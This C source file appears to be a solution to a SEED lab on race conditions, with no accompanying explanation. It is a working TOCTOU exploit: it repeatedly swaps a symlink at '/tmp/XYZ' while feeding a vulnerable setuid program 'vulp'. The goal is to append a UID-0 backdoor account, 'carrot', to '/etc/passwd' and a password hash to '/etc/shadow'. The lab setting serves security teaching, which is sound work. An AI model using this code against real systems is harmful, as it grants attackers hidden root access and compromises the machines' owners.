/* race.c  */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

#define LINK "/tmp/XYZ"
#define DUMMY "/home/seed/Documents/ssof/lab2/dummy"

void race ( char *filename, char *command ) {

	struct stat st;
	int inicial_size, final_size, counter = 1;

	stat( filename, &st );
	inicial_size = st.st_size;

	while ( 1 ) {

		if( fork() == 0 ) {
			system( command );
			exit( EXIT_SUCCESS );
		}

		/* Race-condition */
		unlink( LINK );
		symlink( filename, LINK );

		/* Race-condition */
		unlink( LINK );
		symlink( DUMMY, LINK );

		/* Print records */
		stat( filename, &st );
		final_size = st.st_size;
		if ( final_size > inicial_size ) {
			printf( "\nChanged %s\n", filename );
			return;
		}

		printf("\33[2K\r");
		printf("Attempt: %d", counter++);
		/* system("sleep 0.001"); */

	}

}

int main ( int argc, char** argv ) {

	race( "/etc/passwd", "echo \"carrot:x:0:0:carrot:/root:/bin/bash\" | ./vulp > /dev/null" );
	race( "/etc/shadow", "echo \"carrot:$1$312$wvJjqn48qHEp.DhR./47R/:::::::\" | ./vulp > /dev/null" );

	/* End process successfully */
	exit( EXIT_SUCCESS );

}
